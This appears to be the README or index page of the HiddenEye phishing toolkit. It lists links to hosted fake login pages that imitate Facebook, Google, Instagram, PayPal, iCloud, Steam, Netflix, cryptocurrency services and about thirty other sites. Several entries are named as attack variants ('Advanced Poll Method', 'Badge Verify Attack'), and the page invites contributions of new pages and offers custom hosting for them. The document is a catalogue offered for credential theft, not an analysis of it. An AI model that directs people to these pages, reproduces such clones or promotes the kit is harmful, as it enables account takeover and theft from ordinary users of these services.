[![BuiltWithLove](https://forthebadge.com/images/badges/built-with-love.svg)]()

- Please Let Us Know If You Found Any Broken Phishing Page.
- Help Us To Maintain the Phishing Pages.
- Share Us if You Have Any New Pages.
- Just Create A Issues.
- OR Join Us on Telegram at http://t.me/darksecdev

# TEST PHISHING PAGES (Click on Any Page To Test).

**1) Facebook:**
- [Traditional Facebook login page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/fb_standard/)
- [Advanced Poll Method.](https://darksecdevelopers.github.io/HiddenEye/WebPages/fb_advanced_poll/)
- [Fake Security login with Facebook Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/fb_security_fake/) 
- [Facebook messenger login page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/fb_messenger/)

**2) Google:**
- [Traditional Google login page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/google_standard/)
- [Advanced Poll Method.](https://darksecdevelopers.github.io/HiddenEye/WebPages/google_advanced_poll/)
- [New Google Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/google_advanced_web/)

**3) LinkedIn:**
- [Traditional LinkedIn login page..](https://darksecdevelopers.github.io/HiddenEye/WebPages/linkedin/)

**4) Github:**
- [Traditional Github login page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/GitHub/)

**5) Stackoverflow:**
- [Traditional Stackoverflow login page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/stackoverflow/)

**6) Wordpress:**
- [Similar Wordpress login page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/wordpress/)

**7) Twitter:**
- [Traditional Twitter login page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/twitter/)

**8) Instagram:**
- [Traditional Instagram login page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/Instagram_web/)
- [Instagram Autoliker Phishing Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/Instagram_autoliker/)
- [Instagram Profile Scenario Advanced attack.](https://darksecdevelopers.github.io/HiddenEye/WebPages/Instagram_advanced_attack/)
- [Instagram Badge Verify Attack *[New]*](https://darksecdevelopers.github.io/HiddenEye/WebPages/Instagram_VerifiedBadge/)
- [Instagram AutoFollower Phishing Page](https://darksecdevelopers.github.io/HiddenEye/WebPages/instafollowers/)
 
 **9) SNAPCHAT PHISHING:**
 - [Traditional Snapchat Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/Snapchat_web/)
 
 **10) YAHOO PHISHING:**
 - [Traditional Yahoo Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/yahoo_web/)
 
 **11) TWITCH PHISHING:**
 - [Traditional Twitch Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/twitch/)
 
 **12) MICROSOFT PHISHING:**
 - [Traditional Microsoft-Live Web Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/live_web/)
 
 **13) STEAM PHISHING:**
 - [Traditional Steam Web Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/steam/)
 
 **14) VK PHISHING:**
 - [Traditional VK Web Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/VK/)
 - [Advanced Poll Method.](https://darksecdevelopers.github.io/HiddenEye/WebPages/VK_poll_method/)
 
 **15) ICLOUD PHISHING:**
 - [Traditional iCloud Web Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/iCloud/)
 
 **16) GitLab PHISHING:**
 - [Traditional GitLab Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/gitlab/)
 
 **17) NetFlix PHISHING:**
  - [Traditional Netflix Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/netflix/)
 
 **18) Origin PHISHING:**
  - [Traditional Origin Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/origin/)
 
 **19) Pinterest PHISHING:**
  - [Traditional Pinterest Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/pinterest/)
 
 **20) Protonmail PHISHING:**
  - [Traditional Protonmail Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/protonmail/)
 
 **21) Spotify PHISHING:**
  - [Traditional Spotify Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/spotify/)
 
 **22) Quora PHISHING:**
  - [Traditional Quora Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/quora/)
 
 **23) PornHub PHISHING:**
 - [Traditional PornHub Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/pornhub/)
 
 **24) Adobe PHISHING:**
  - [Traditional Adobe Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/adobe/)
 
 **25) Badoo PHISHING:**
  - [Traditional Badoo Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/badoo/)
 
 **26) CryptoCurrency PHISHING:**
  - [Traditional CryptoCurrency Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/cryptocurrency/)
 
 **27) DevianArt PHISHING:**
   - [Traditional DevianArt Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/devianart/)
 
 **28) DropBox PHISHING:**
   - [Traditional DropBox Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/dropbox/)
 
 **29) eBay PHISHING:**
   - [Traditional eBay Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/ebay/)
 
 **30) MySpace PHISHING:**
   - [Traditional Myspace Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/myspace/)
 
 **31) PayPal PHISHING:**
   - [Traditional PayPal Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/paypal/)
 
 **32) Shopify PHISHING:**
   - [Traditional Shopify Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/shopify/)
 
 **33) Verizon PHISHING:**
   - [Traditional Verizon Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/verizon/)
   
 **34) Yandex PHISHING:**
   - [Traditional Yandex Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/yandex/)
   
 **35) Reddit PHISHING:**
   - [Old Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/Reddit-old/)
   - [New Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/Reddit/)

 **36) Subito&#46;it PHISHING:**
   - [Traditional Subito Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/subitoit/)

 **37) PlayStation PHISHING:**
   - [Traditional PlayStation Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/playstation/)
 
 **38) Xbox PHISHING:**
   - [Traditional Xbox Login Page.](https://darksecdevelopers.github.io/HiddenEye/WebPages/xbox/)
 
 **39) CUSTOM(1) PHISHING:** 
   - Host Your Own Phishing Pages
 
 **40) CUSTOM(2) PHISHING:**
   - Host Your multiple Phishing Pages at once
